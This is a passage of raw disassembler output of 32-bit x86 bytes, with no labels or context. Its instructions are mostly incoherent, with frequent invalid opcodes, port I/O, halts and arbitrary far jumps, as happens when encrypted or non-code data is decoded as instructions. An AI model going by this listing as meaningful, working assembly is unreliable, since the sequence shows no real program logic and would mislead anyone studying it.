  40dc56:	fisttp WORD PTR [edx+0x24]
  40dc59:	stos   BYTE PTR es:[edi],al
  40dc5a:	sbb    ecx,DWORD PTR [ecx+edx*4+0x52]
  40dc5e:	out    dx,al
  40dc5f:	scas   al,BYTE PTR es:[edi]
  40dc60:	imul   edi,DWORD PTR [eax+0x34],0xd0aeaedd
  40dc67:	cmp    DWORD PTR [ebx],edi
  40dc69:	das    
  40dc6a:	mov    ds:0xb19af8dc,al
  40dc6f:	jmp    0x40dc81
  40dc71:	and    ecx,DWORD PTR [ecx]
  40dc73:	mov    esp,0xf79e08f1
  40dc78:	std    
  40dc79:	cwde   
  40dc7a:	inc    esi
  40dc7b:	stc    
  40dc7c:	inc    ebp
  40dc7d:	les    esp,FWORD PTR [edx-0x15]
  40dc80:	mov    WORD PTR [ebx],ds
  40dc82:	adc    DWORD PTR [ecx+edx*2+0x32],eax
  40dc86:	pusha  
  40dc87:	or     edx,edx
  40dc89:	mov    ah,0x32
  40dc8b:	pop    esi
  40dc8c:	scas   al,BYTE PTR es:[edi]
  40dc8d:	hlt    
  40dc8e:	fisub  WORD PTR [eax+ebx*1]
  40dc91:	sub    DWORD PTR gs:[ebx-0x75],edx
  40dc95:	xchg   ebp,eax
  40dc96:	lock sbb esp,edi
  40dc99:	push   ds
  40dc9a:	push   esi
  40dc9b:	cmp    eax,0x8a178e4b
  40dca0:	iret   
  40dca1:	xchg   ebx,eax
  40dca2:	in     al,dx
  40dca3:	cmp    BYTE PTR [ebp-0x35],ah
  40dca6:	mov    ebp,0xc128a212
  40dcab:	adc    esp,edi
  40dcad:	push   ds
  40dcae:	mov    eax,0xa82e04f9
  40dcb3:	(bad)  
  40dcb4:	dec    esp
  40dcb5:	(bad)  
  40dcb6:	sti    
  40dcb7:	lahf   
  40dcb8:	repnz mov ebx,0x89490c3f
  40dcbe:	pop    esi
  40dcbf:	(bad)
  40dcc4:	jl     0x40dd0a
  40dcc6:	stc    
  40dcc7:	mov    esi,0xbfccf018
  40dccc:	cdq    
  40dccd:	cmp    DWORD PTR [ebx+0x165f66ed],ecx
  40dcd3:	push   edx
  40dcd4:	test   BYTE PTR [ebx-0x5029bdec],cl
  40dcda:	mov    cl,0x8c
  40dcdc:	(bad)  [esi+0x56]
  40dcdf:	bnd jno 0x40dd58
  40dce2:	std    
  40dce3:	mov    cl,0x64
  40dce5:	(bad)  
  40dce6:	adc    ah,al
  40dce8:	das    
  40dce9:	xor    eax,0xb67e0f36
  40dcee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcef:	adc    bl,BYTE PTR [ebx-0x43]
  40dcf2:	fnstenv [esi+0x1d]
  40dcf5:	pop    edx
  40dcf6:	dec    esi
  40dcf7:	loopne 0x40dc7c
  40dcf9:	or     ch,BYTE PTR [edx]
  40dcfb:	jge    0x40dcf4
  40dcfd:	mov    dl,0xb8
  40dcff:	cmp    BYTE PTR [ecx+esi*1],dl
  40dd02:	ins    DWORD PTR es:[edi],dx
  40dd03:	scas   al,BYTE PTR es:[edi]
  40dd04:	data16 mov bh,0xa2
  40dd07:	(bad)  
  40dd08:	stos   DWORD PTR es:[edi],eax
  40dd09:	icebp  
  40dd0a:	mov    edx,0xb6350e3
  40dd0f:	lock dec si
  40dd12:	daa    
  40dd13:	aas    
  40dd14:	in     eax,dx
  40dd15:	in     eax,dx
  40dd16:	test   DWORD PTR [edi-0x770a60a9],esi
  40dd1c:	pop    esi
  40dd1d:	mov    eax,0x89ccabd9
  40dd22:	das    
  40dd23:	push   ecx
  40dd24:	push   ds
  40dd25:	inc    esp
  40dd26:	clc    
  40dd27:	(bad)  
  40dd28:	enter  0x24fd,0xd7
  40dd2c:	sub    eax,0xbccc1558
  40dd31:	sub    dl,BYTE PTR [eax-0x17f69542]
  40dd37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd38:	push   ebx
  40dd39:	push   eax
  40dd3a:	push   edi
  40dd3b:	stc    
  40dd3c:	mov    BYTE PTR [edx-0x37],bl
  40dd3f:	ins    DWORD PTR es:[edi],dx
  40dd40:	inc    edx
  40dd41:	fidivr DWORD PTR [ecx+esi*2-0x3597469c]
  40dd48:	mov    eax,ds:0x8dca657e
  40dd4d:	and    ebx,DWORD PTR [ebp+0x55]
  40dd50:	aaa    
  40dd51:	jb     0x40dd10
  40dd53:	add    esi,DWORD PTR [ebx-0x7e]
  40dd56:	mov    dl,0x7f
  40dd58:	mov    DWORD PTR [eax-0x4cebecf6],ebx
  40dd5e:	or     eax,0xff26685f
  40dd63:	and    BYTE PTR [esi-0x26],bh
  40dd66:	mov    edx,0x54102939
  40dd6b:	add    edx,DWORD PTR [ebp-0x34b22d40]
  40dd71:	not    ah
  40dd73:	sbb    dl,bh
  40dd75:	arpl   WORD PTR [ecx],bp
  40dd77:	xor    ebx,DWORD PTR [ebx-0x4f]
  40dd7a:	mov    al,0xb8
  40dd7c:	in     al,dx
  40dd7d:	fisttp WORD PTR [esi]
  40dd7f:	pop    ebx
  40dd80:	push   0x7b
  40dd82:	jo     0x40ddfb
  40dd84:	repnz mov dl,0x51
  40dd87:	xlat   BYTE PTR ds:[ebx]
  40dd88:	nop
  40dd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd8a:	mov    ebp,0x43369d63
  40dd8f:	mov    dl,0x61
  40dd91:	fild   DWORD PTR [ebp+0x7c80f96]
  40dd97:	mov    esi,0xd6972fc6
  40dd9c:	aam    0x18
  40dd9e:	(bad)  
  40dd9f:	(bad)  
  40dda0:	and    BYTE PTR [esi+edx*8-0x6b],bh
  40dda4:	push   ss
  40dda5:	shl    BYTE PTR [ecx-0x5d],cl
  40dda8:	cmp    eax,0xc931dbe3
  40ddad:	jo     0x40dd38
  40ddaf:	xchg   ecx,eax
  40ddb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddb1:	mov    dh,0x98
  40ddb4:	fwait
  40ddb5:	sahf   
  40ddb6:	cmp    ebx,esp
  40ddb8:	pop    es
  40ddb9:	xchg   edx,eax
  40ddba:	pop    edx
  40ddbb:	retf   
  40ddbc:	add    eax,0x88b32f35
  40ddc1:	cmp    bh,0x6b
  40ddc4:	sbb    esi,esi
  40ddc6:	pop    ebx
  40ddc7:	jns    0x40de24
  40ddc9:	mov    es,WORD PTR [ebp-0x27b7e254]
  40ddcf:	adc    BYTE PTR [esi+0x33c6f76],dh
  40ddd5:	ins    DWORD PTR es:[edi],dx
  40ddd6:	mov    dh,0xfc
  40ddd8:	cmp    DWORD PTR [ecx+0x9947401],eax
  40ddde:	cli    
  40dddf:	fs leave 
  40dde1:	es (bad) 
  40dde3:	jno    0x40de27
  40dde5:	pop    ecx
  40dde6:	jp     0x40de56
  40dde8:	sbb    al,0x5a
  40ddea:	imul   edx,esp,0x16
  40dded:	lock pushf 
  40ddef:	int    0xa4
  40ddf1:	das    
  40ddf2:	sub    eax,0x78db377a
  40ddf7:	leave  
  40ddf8:	test   DWORD PTR [ecx-0x75ad846d],esp
  40ddfe:	les    eax,FWORD PTR [edx]
  40de00:	jne    0x40dda1
  40de02:	or     DWORD PTR [eax-0x21],edi
  40de05:	jae    0x40de27
  40de07:	arpl   WORD PTR [esi-0x20],cx
  40de0a:	mov    esp,0xb2db663e
  40de0f:	xor    esi,ebp
  40de11:	addr16 jg 0x40de50
  40de14:	int3   
  40de15:	sub    al,0xaf
  40de17:	add    eax,0x4fbdb06c
  40de1c:	add    edx,ebp
  40de1e:	out    0x92,al
  40de20:	push   eax
  40de21:	cmp    al,0x8
  40de23:	sbb    eax,0x37c8e931
  40de28:	xchg   edi,eax
  40de29:	pusha  
  40de2a:	mov    cs,WORD PTR [eax-0x324c1536]
  40de30:	sub    edx,DWORD PTR ds:0x5b6fb3a8
  40de36:	and    DWORD PTR [ecx+0x18],ebp
  40de39:	xchg   esi,eax
  40de3a:	(bad)  
  40de3b:	hlt    
  40de3c:	adc    eax,0x2e54fa7
  40de41:	xor    dh,BYTE PTR [edi+0x1beb6985]
  40de47:	mov    dh,0x92
  40de49:	inc    ecx
  40de4a:	lds    esi,FWORD PTR [edx+ebp*8-0x56]
  40de4e:	adc    BYTE PTR [esi],0x7f
  40de51:	test   al,0x1f
  40de53:	ret    0xf8c7
  40de56:	ror    ecx,cl
  40de58:	mov    ebp,0xd1052686
  40de5d:	cmp    eax,0x495fe706
  40de62:	push   0xf6833d0a
  40de67:	sub    ah,BYTE PTR [edi-0x633df72c]
  40de6d:	mov    esp,0x3e957515
  40de72:	or     BYTE PTR [esi],al
  40de74:	js     0x40de34
  40de76:	imul   ecx,DWORD PTR [ebp+0x4ef7c149],0x6c36bb9f
  40de80:	mov    cl,0xad
  40de82:	outs   dx,BYTE PTR ds:[esi]
  40de83:	les    ecx,FWORD PTR [ebx-0x77]
  40de86:	mov    esi,0x69e5beae
  40de8b:	sbb    BYTE PTR [edx],al
  40de8d:	in     al,dx
  40de8e:	(bad)  
  40de8f:	and    al,0x10
  40de91:	ret    0xda6a
  40de94:	adc    ch,0xe5
  40de97:	in     eax,0xfe
  40de99:	or     DWORD PTR [edx-0x42],ebx
  40de9c:	xlat   BYTE PTR ds:[ebx]
  40de9d:	xor    ah,0xff
  40dea0:	cmp    esp,DWORD PTR [edi]
  40dea2:	bound  eax,QWORD PTR [esi+ebp*1]
  40dea5:	inc    esp
  40dea6:	lds    ebx,FWORD PTR [esi+0x79]
  40dea9:	xchg   ecx,eax
  40deaa:	mov    dh,BYTE PTR [edi-0x20]
  40dead:	ret    
  40deae:	dec    ebx
  40deaf:	(bad)  
  40deb0:	lock data16 stos BYTE PTR es:[edi],al
  40deb3:	fst    QWORD PTR [esp+eiz*8+0x4f5840c4]
  40deba:	data16 or dl,BYTE PTR [ebp+0x14]
  40debe:	ret    
  40debf:	xor    dl,BYTE PTR [ebx]
  40dec1:	mov    esp,0x18a3a6ab
  40dec6:	xchg   esp,eax
  40dec7:	jp     0x40de7a
  40dec9:	aad    0x9a
  40decb:	js     0x40df00
  40decd:	dec    esi
  40dece:	sub    BYTE PTR [ebx-0x57351f96],ch
  40ded4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded5:	or     edi,DWORD PTR [eax-0x52]
  40ded8:	es sub eax,ebp
  40dedb:	inc    esp
  40dedc:	sbb    eax,0x85aab54d
  40dee1:	inc    esi
  40dee2:	sbb    ah,BYTE PTR [ecx+0x7a]
  40dee5:	sub    dl,BYTE PTR [edx]
  40dee7:	sbb    al,0xcf
  40dee9:	cmp    DWORD PTR [ecx-0x1190fc83],esp
  40deef:	push   eax
  40def0:	(bad)  
  40def1:	aas    
  40def2:	sbb    DWORD PTR [esi],ebx
  40def4:	inc    esp
  40def5:	adc    cl,BYTE PTR [ebp-0x6d]
  40def8:	inc    eax
  40def9:	adc    ah,BYTE PTR [eax+0x6e49f1b6]
  40deff:	outs   dx,DWORD PTR ds:[esi]
  40df00:	or     ah,BYTE PTR [esi-0x1a090a5c]
  40df06:	rol    WORD PTR [eax],1
  40df09:	cmp    BYTE PTR ds:0x830f5ba5,ah
  40df0f:	mov    esp,0x1604855c
  40df14:	inc    esp
  40df15:	xor    cl,BYTE PTR [ebx+eax*2-0x61ff645]
  40df1c:	cmp    al,0x4
  40df1e:	and    eax,0x4cc014f2
  40df23:	push   eax
  40df24:	jbe    0x40dea9
  40df26:	(bad)  
  40df27:	pop    ds
  40df28:	mov    edx,0xda599513
  40df2d:	sahf   
  40df2e:	mov    edi,0xc0e3faf6
  40df33:	add    BYTE PTR [ecx+edi*4+0x75],bl
  40df37:	jmp    0x40def9
  40df39:	jmp    0x40df0c
  40df3b:	jns    0x40df7a
  40df3d:	mov    ch,0x6c
  40df3f:	or     ah,BYTE PTR [ecx+ecx*1+0x12]
  40df43:	daa    
  40df44:	cmp    al,0x84
  40df46:	(bad)  
  40df47:	es mov bh,0x2d
  40df4a:	bound  ebp,QWORD PTR [edx+0x7b]
  40df4d:	inc    esi
  40df4e:	mov    dl,0xca
  40df50:	mov    dh,0x55
  40df52:	sbb    BYTE PTR [ebx+0x1c],cl
  40df55:	dec    ecx
  40df56:	mov    esi,0x63a2ce59
  40df5b:	(bad)  
  40df5c:	leave  
  40df5d:	jmp    0x40df05
  40df5f:	mov    eax,0x147cca63
  40df64:	dec    ebp
  40df65:	cmp    BYTE PTR [ecx],bl
  40df67:	bound  ebx,QWORD PTR [esi]
  40df69:	sbb    al,0xd7
  40df6b:	xor    DWORD PTR [edx+ecx*4],eax
  40df6e:	push   es
  40df6f:	or     eax,0xbedf631c
  40df74:	dec    ecx
  40df75:	call   0x786d:0x611dce03
  40df7c:	cmp    eax,0x5a65c21e
  40df81:	inc    esi
  40df82:	push   es
  40df83:	fiadd  DWORD PTR [esp+ebx*4-0x775fca40]
  40df8a:	jg     0x40dfd9
  40df8c:	sub    BYTE PTR ds:0xe2247bbe,cl
  40df92:	mov    edi,DWORD PTR ds:0x6b835042
  40df98:	lock ss call 0x4a04bfe
  40df9f:	cwde   
  40dfa0:	push   esi
  40dfa1:	int    0x3e
  40dfa3:	xchg   esp,eax
  40dfa4:	mov    ah,0xbc
  40dfa6:	int3   
  40dfa7:	mov    edi,0x54db40fe
  40dfac:	cs retf 0xc2c5
  40dfb0:	dec    ecx
  40dfb1:	xor    BYTE PTR [eax+0x67],bh
  40dfb4:	and    ch,BYTE PTR [ebx-0x1f]
  40dfb7:	pop    esi
  40dfb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfb9:	rcr    DWORD PTR [edx],cl
  40dfbb:	push   ds
  40dfbc:	lds    edi,FWORD PTR [ecx+0x29c1ca4f]
  40dfc2:	popa   
  40dfc3:	imul   ebp,DWORD PTR [esi-0x7c59f69b],0xbfd795a4
  40dfcd:	mov    dl,0xbd
  40dfcf:	adc    eax,0xf02b020c
  40dfd5:	stos   DWORD PTR es:[edi],eax
  40dfd6:	mov    esi,0x3035147
  40dfdb:	add    ah,dl
  40dfdd:	pop    ds
  40dfde:	aaa    
  40dfdf:	les    esi,FWORD PTR [edi]
  40dfe1:	retf   0xca63
  40dfe4:	mov    ds:0xcb14d3dc,al
  40dfe9:	push   ecx
  40dfea:	dec    edx
  40dfeb:	iret   
  40dfec:	mov    ds:0xcbdcb682,eax
  40dff1:	outs   dx,BYTE PTR ds:[esi]
  40dff2:	mov    WORD PTR [esi+0x3],ds
  40dff5:	mov    esi,0x9de40262
  40dffa:	jg     0x40df99
  40dffc:	int    0xd0
  40dffe:	mov    ebx,0xe67e5649
  40e003:	or     eax,0xb2c2106a
  40e008:	fstp   DWORD PTR [eax]
  40e00a:	xchg   esp,eax
  40e00b:	in     al,0xe0
  40e00d:	and    bh,cl
  40e00f:	mov    esi,DWORD PTR [eax-0x29313055]
  40e015:	push   esi
  40e016:	stos   DWORD PTR es:[edi],eax
  40e017:	in     al,dx
  40e018:	jge    0x40e013
  40e01a:	imul   edi,DWORD PTR [edx],0x13
  40e01d:	and    BYTE PTR ss:[ebx+0x459da71c],al
  40e024:	add    DWORD PTR [ebp+0x28e8d979],0xffffffe3
  40e02b:	jecxz  0x40e08b
  40e02d:	mov    ah,0x21
  40e02f:	xchg   esi,eax
  40e030:	pop    esp
  40e031:	mov    BYTE PTR [edx+eax*1+0x2f20738e],ch
  40e038:	scas   eax,DWORD PTR es:[edi]
  40e039:	jns    0x40e076
  40e03b:	fist   DWORD PTR [ebp+0x5bbe51a]
  40e041:	loope  0x40dfd2
  40e043:	push   ds
  40e044:	inc    ebp
  40e045:	and    eax,0xaf88ee27
  40e04a:	mov    es:0xe147d1bd,eax
  40e050:	jbe    0x40e05b
  40e052:	ins    BYTE PTR es:[edi],dx
  40e053:	sub    al,0x6a
  40e055:	aas    
  40e056:	pop    esp
  40e057:	test   al,0x44
  40e059:	adc    ecx,DWORD PTR [ebp+0x57]
  40e05c:	enter  0x109c,0x66
  40e060:	hlt    
  40e061:	(bad)  
  40e062:	fild   QWORD PTR [edx+edi*8]
  40e065:	repnz dec ebp
  40e067:	test   eax,0xa19c171
  40e06c:	int    0x3a
  40e06e:	repnz and esi,DWORD PTR ds:0xc073fbd1
  40e075:	outs   dx,BYTE PTR ds:[esi]
  40e076:	sti    
  40e077:	(bad)  
  40e078:	jle    0x40e0dc
  40e07a:	clc    
  40e07b:	mov    al,BYTE PTR [esi+0x7d02ab42]
  40e081:	jne    0x40e047
  40e083:	call   0xb04a:0x23bde1a1
  40e08a:	push   es
  40e08b:	mov    esp,0xfff6e3e1
  40e090:	dec    ebp
  40e091:	pop    ebp
  40e092:	lea    esi,[edi+0x41faf574]
  40e098:	imul   eax,DWORD PTR [edx],0x4c
  40e09b:	in     al,dx
  40e09c:	nop
  40e09d:	and    al,0xce
  40e09f:	pop    ebp
  40e0a0:	ret    0xa094
  40e0a3:	gs jmp 0x67cb:0xb9784b56
  40e0ab:	loopne 0x40e0b7
  40e0ad:	inc    ebp
  40e0ae:	xor    al,0xbf
  40e0b0:	mov    ch,BYTE PTR [ebx+0x536421e6]
  40e0b6:	adc    edx,esi
  40e0b8:	push   esi
  40e0b9:	shl    DWORD PTR [esp+ebp*2-0xb],cl
  40e0bd:	iret   
  40e0be:	leave  
  40e0bf:	shl    DWORD PTR [eax+0x3e6261e0],0xf5
  40e0c6:	jl     0x40e072
  40e0c8:	xchg   BYTE PTR [edi-0x60],dl
  40e0cb:	bound  ebp,QWORD PTR [edi-0x4d]
  40e0ce:	push   0xfffffffc
  40e0d0:	ins    BYTE PTR es:[edi],dx
  40e0d1:	jae    0x40e087
  40e0d3:	inc    esi
  40e0d4:	mov    BYTE PTR [ebp-0x2b99b5ed],ch
  40e0da:	call   0xdaac3e45
  40e0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e0:	and    al,0xfa
  40e0e2:	jl     0x40e11e
  40e0e4:	cli    
  40e0e5:	clc    
  40e0e6:	sbb    BYTE PTR [ebp+0x7342940f],bh
  40e0ec:	or     al,0x61
  40e0ee:	lock adc DWORD PTR [esp+edx*4],esp
  40e0f2:	adc    eax,0x8e8ca045
  40e0f7:	pop    esp
  40e0f8:	and    eax,0xae66c1fd
  40e0fd:	mov    WORD PTR [eax+0x784f4162],ss
  40e103:	(bad)  
  40e104:	ror    DWORD PTR ds:0xe1d695cf,cl
  40e10a:	retf   0xed99
  40e10d:	add    eax,0x27b3e130
  40e112:	cmp    al,0xe7
  40e114:	fld    QWORD PTR [eax+0x7ab0793f]
  40e11a:	dec    edx
  40e11b:	mov    cl,0xa4
  40e11d:	jecxz  0x40e183
  40e11f:	or     al,0x10
  40e121:	xor    DWORD PTR [edx],ecx
  40e123:	sub    eax,0x2e966c3c
  40e128:	pop    esi
  40e129:	xchg   ecx,eax
  40e12a:	mov    cl,0xa6
  40e12c:	mul    BYTE PTR [eax-0x4db26aee]
  40e132:	dec    esp
  40e133:	push   es
  40e134:	push   DWORD PTR [esi-0x55]
  40e137:	push   ds
  40e138:	retf   0x119f
  40e13b:	jecxz  0x40e135
  40e13d:	dec    edx
  40e13e:	call   0xf34b:0xfd5b04cf
  40e145:	repz push 0x6a
  40e148:	dec    BYTE PTR [ebx+0x4736eec1]
  40e14e:	in     al,dx
  40e14f:	nop
  40e150:	loop   0x40e12d
  40e152:	push   cs
  40e153:	sahf   
  40e154:	sbb    ebp,ebx
  40e156:	pop    ss
  40e157:	pop    ebp
  40e158:	test   DWORD PTR [ecx],ebx
  40e15a:	sahf   
  40e15b:	sbb    edi,DWORD PTR [ecx+0x69384ba]
  40e161:	sti    
  40e162:	in     al,0x55
  40e164:	popf   
  40e165:	aad    0xfa
  40e167:	jnp    0x40e1e2
  40e169:	dec    edx
  40e16a:	lock xor al,0x26
  40e16d:	ret    
  40e16e:	test   DWORD PTR [eax-0xd],eax
  40e171:	sub    eax,0xfb4d7d30
  40e176:	bound  esi,QWORD PTR [esi+0x256d56da]
  40e17c:	mov    eax,0x4cecfdc7
  40e181:	sahf   
  40e182:	dec    esp
  40e183:	(bad)  
  40e184:	aaa    
  40e185:	in     eax,0x44
  40e187:	and    edx,0xe066be52
  40e18d:	mov    ds:0x5efcc3db,eax
  40e192:	cmp    ecx,edx
  40e194:	cmp    BYTE PTR [esi+edx*8],bl
  40e197:	mov    ebx,0x8ab4230c
  40e19c:	int3   
  40e19d:	inc    ebp
  40e19e:	loop   0x40e1ee
  40e1a0:	lods   al,BYTE PTR ds:[esi]
  40e1a1:	jb     0x40e1d2
  40e1a3:	mov    esp,0x8e098dc2
  40e1a8:	sub    eax,0x90b63429
  40e1ad:	icebp  
  40e1ae:	mov    dh,0x7b
  40e1b0:	shl    dl,0xe8
  40e1b3:	add    cl,bh
  40e1b5:	mov    BYTE PTR [ebp-0x283bcb49],ah
  40e1bb:	shl    DWORD PTR [ebx+0x4c],0x1c
  40e1bf:	jbe    0x40e188
  40e1c1:	and    DWORD PTR ds:[edx],edx
  40e1c4:	jno    0x40e1e9
  40e1c6:	jne    0x40e224
  40e1c8:	fld    DWORD PTR [edi-0x6d]
  40e1cb:	loopne 0x40e1fb
  40e1cd:	mov    bh,0x94
  40e1cf:	xchg   esi,eax
  40e1d0:	lods   eax,DWORD PTR ds:[esi]
  40e1d1:	fnsave [esi+esi*8]
  40e1d4:	(bad)  
  40e1d5:	rcr    DWORD PTR [ebx-0x25],cl
  40e1d8:	test   al,0x4
  40e1da:	mov    ah,0x9
  40e1dc:	jb     0x40e1fc
  40e1de:	adc    ebp,edi
  40e1e0:	test   al,0x7f
  40e1e2:	jmp    0x4cc9:0x4764c862
  40e1e9:	jno    0x40e238
  40e1eb:	push   edi
  40e1ec:	popf   
  40e1ed:	xchg   esp,eax
  40e1ee:	cld    
  40e1ef:	push   cs
  40e1f0:	stos   BYTE PTR es:[edi],al
  40e1f1:	repnz or eax,0xab43677a
  40e1f7:	stc    
  40e1f8:	adc    BYTE PTR [esi-0x5d],bh
  40e1fb:	shl    cl,1
  40e1fd:	mov    eax,DWORD PTR [esi-0x13]
  40e200:	dec    eax
  40e201:	xor    edx,DWORD PTR [edi+ebp*8-0x71768631]
  40e208:	outs   dx,BYTE PTR ds:[esi]
  40e209:	arpl   WORD PTR [edi+0x10],cx
  40e20c:	retf   
  40e20d:	int3   
  40e20e:	mov    esp,0x63b203e2
  40e213:	stc    
  40e214:	pop    ss
  40e215:	and    ch,ah
  40e217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e218:	enter  0xec51,0x80
  40e21c:	mul    edx
  40e21e:	mov    ebp,0x70df8948
  40e223:	cli    
  40e224:	mov    ds:0x9b1906db,al
  40e229:	jmp    0x40e1f4
  40e22b:	hlt    
  40e22c:	jno    0x40e27f
  40e22e:	push   ecx
  40e22f:	popa   
  40e230:	lods   al,BYTE PTR ds:[esi]
  40e231:	sahf   
  40e232:	dec    ecx
  40e233:	int3   
  40e234:	sahf   
  40e235:	(bad)  
  40e236:	xchg   edi,eax
  40e237:	loope  0x40e27f
  40e239:	in     al,0xda
  40e23b:	enter  0x69ce,0xe3
  40e23f:	cmp    ebx,edi
  40e241:	mov    al,0xa6
  40e243:	aam    0x1f
  40e245:	es jecxz 0x40e278
  40e248:	jg     0x40e227
  40e24a:	pop    ds
  40e24b:	push   eax
  40e24c:	in     eax,0x68
  40e24e:	or     al,0xc5
  40e250:	pop    es
  40e251:	inc    ecx
  40e252:	idiv   BYTE PTR [eax]
  40e254:	xchg   ebp,eax
  40e255:	in     eax,0x98
  40e257:	test   BYTE PTR [edx+0x13],ah
  40e25a:	fisubr DWORD PTR [edi+0x4f]
  40e25d:	pusha  
  40e25e:	aaa    
  40e25f:	lahf   
  40e260:	fnsave [esi]
  40e262:	xor    eax,0xdc7f5bd1
  40e267:	into   
  40e268:	fsub   QWORD PTR [ebp+0x5a]
  40e26b:	ss data16 gs daa 
  40e26f:	sahf   
  40e270:	ss leave 
  40e272:	lods   al,BYTE PTR ds:[esi]
  40e273:	ror    DWORD PTR [esi],1
  40e275:	cld    
  40e276:	ret    0x7fed
  40e279:	mov    ecx,0x963f98
  40e27e:	lods   eax,DWORD PTR ds:[esi]
  40e27f:	jg     0x40e293
  40e281:	mov    ds:0x4c0614c,al
  40e286:	sub    eax,0x802cbef8
  40e28b:	in     eax,dx
  40e28c:	jmp    0x90c80d4f
  40e291:	test   DWORD PTR [edi],edx
  40e293:	retf   0x534b
  40e296:	pop    ebx
  40e297:	ja     0x40e28a
  40e299:	inc    esi
  40e29a:	int    0x92
  40e29c:	mov    ebx,0x11514719
  40e2a1:	sbb    eax,0x94d2c4ac
  40e2a6:	xchg   edi,eax
  40e2a7:	mov    dl,0x4a
  40e2a9:	jl     0x40e287
  40e2ab:	cmp    bl,al
  40e2ad:	mov    DWORD PTR [ecx+0x67032fa5],esi
  40e2b3:	test   eax,0xd908a593
  40e2b8:	call   0xcffe47ff
  40e2bd:	mov    al,0x9a
  40e2bf:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40e2c1:	xor    DWORD PTR [edx-0x4d750bd4],ecx
  40e2c7:	cmp    esi,DWORD PTR [eax+ebx*8-0x27]
  40e2cb:	and    eax,0x20a64204
  40e2d0:	cmp    DWORD PTR [ecx+0x6b],ebx
  40e2d3:	mov    esp,0xd90a382d
  40e2d8:	dec    esi
  40e2d9:	adc    BYTE PTR [edx*8-0x5f4fda1a],al
  40e2e0:	adc    eax,0x46
  40e2e3:	jnp    0x40e2a1
  40e2e5:	push   esp
  40e2e7:	fcmovnb st,st(2)
  40e2e9:	imul   esi,ebx,0x23012a7a
  40e2ef:	scas   al,BYTE PTR es:[edi]
  40e2f0:	sbb    al,0x27
  40e2f2:	shr    ecx,cl
  40e2f4:	dec    edx
  40e2f5:	fisttp DWORD PTR cs:[ecx+0x410dd3fc]
  40e2fc:	cs mov ecx,0xaf6d32b2
  40e302:	ss imul esi,DWORD PTR ds:0xda375960,0x39
  40e30b:	xchg   edi,esp
  40e30d:	aaa    
  40e30e:	sar    BYTE PTR [edx],0x54
  40e311:	daa    
  40e312:	cwde   
  40e313:	psllw  mm3,QWORD PTR [ebx+0x773c5fee]
  40e31a:	outs   dx,BYTE PTR ds:[esi]
  40e31b:	xchg   esi,eax
  40e31c:	into   
  40e31d:	mov    ch,0xdd
  40e31f:	sub    esi,DWORD PTR [ecx+0x68]
  40e322:	add    BYTE PTR [edi-0x16f0e9c2],bl
  40e328:	jnp    0x40e343
  40e32a:	inc    edx
  40e32b:	sub    eax,0x5854043a
  40e330:	js     0x40e2bd
  40e332:	sub    al,0x38
  40e334:	inc    edx
  40e335:	mov    ch,0x63
  40e337:	into   
  40e338:	pop    ds
  40e339:	outs   dx,DWORD PTR ds:[esi]
  40e33a:	jno    0x40e38b
  40e33c:	jmp    0x40e370
  40e33e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33f:	mov    DWORD PTR [ebp+0x5e646422],ebp
  40e345:	stc    
  40e346:	in     eax,0xe9
  40e348:	dec    edi
  40e349:	jmp    DWORD PTR [edi+0x52f61452]
  40e34f:	test   DWORD PTR [ebp+0x1f6f904d],0xd07bf10e
  40e359:	call   0x6f36:0x7851f955
  40e360:	ret    
  40e361:	ja     0x40e318
  40e363:	pop    esi
  40e364:	add    al,0xfe
  40e366:	mov    eax,ds:0x1e333d28
  40e36b:	mov    edi,0xc3c3f2d9
  40e370:	adc    cl,BYTE PTR [ebx-0x38e498ec]
  40e376:	pop    edx
  40e377:	aas    
  40e378:	ins    BYTE PTR es:[edi],dx
  40e379:	popf   
  40e37a:	ret    
  40e37b:	or     eax,0x3c4451dd
  40e380:	inc    ebx
  40e381:	aas    
  40e382:	or     DWORD PTR [eax+0x61],edi
  40e385:	sub    ebx,ebp
  40e387:	mov    ebx,0xc236137f
  40e38c:	mov    ebx,0xd5171ba2
  40e391:	mov    esi,0xfcd529c7
  40e396:	out    dx,al
  40e397:	clc    
  40e398:	data16 loopne 0x40e39c
  40e39b:	xlat   BYTE PTR ds:[ebx]
  40e39c:	gs push ebx
  40e39e:	cmp    al,0x57
  40e3a0:	xlat   BYTE PTR ds:[ebx]
  40e3a1:	sbb    ecx,DWORD PTR [edx+0x4eed562b]
  40e3a7:	mov    bl,0x3a
  40e3a9:	out    dx,eax
  40e3aa:	jecxz  0x40e412
  40e3ac:	out    0xbf,al
  40e3ae:	popf   
  40e3af:	sbb    DWORD PTR [edx],ebx
  40e3b1:	mov    dh,0x7b
  40e3b3:	ds sub al,0xc0
  40e3b6:	in     eax,dx
  40e3b7:	call   0x5eb0:0x94cad275
  40e3be:	out    dx,eax
  40e3bf:	mov    ch,0x28
  40e3c1:	lahf   
  40e3c2:	lahf   
  40e3c3:	ret    0x12cf
  40e3c6:	mov    eax,ds:0xc2f9eb9e
  40e3cb:	cld    
  40e3cc:	and    al,0x92
  40e3ce:	test   al,0xd1
  40e3d0:	inc    ebp
  40e3d1:	call   0x890e6fba
  40e3d6:	lock cmp eax,0x80f9a194
  40e3dc:	pushf  
  40e3dd:	push   ebx
  40e3de:	jbe    0x40e44d
  40e3e0:	aad    0xb1
  40e3e2:	mov    WORD PTR [eax],gs
  40e3e4:	fst    QWORD PTR ds:0x46aaa687
  40e3ea:	mov    ?,WORD PTR [esi-0x20]
  40e3ed:	mov    ecx,0x7a58cc00
  40e3f2:	dec    ebx
  40e3f3:	mov    bh,0x32
  40e3f5:	out    0x99,eax
  40e3f7:	retf   0x3bbf
  40e3fa:	sbb    bl,al
  40e3fc:	jp     0x40e3b3
  40e3fe:	repnz stos BYTE PTR es:[edi],al
  40e400:	dec    esp
  40e401:	jl     0x40e3ab
  40e403:	mov    bh,BYTE PTR [esi]
  40e405:	add    DWORD PTR [edx-0x6c],ecx
  40e408:	and    ecx,ebx
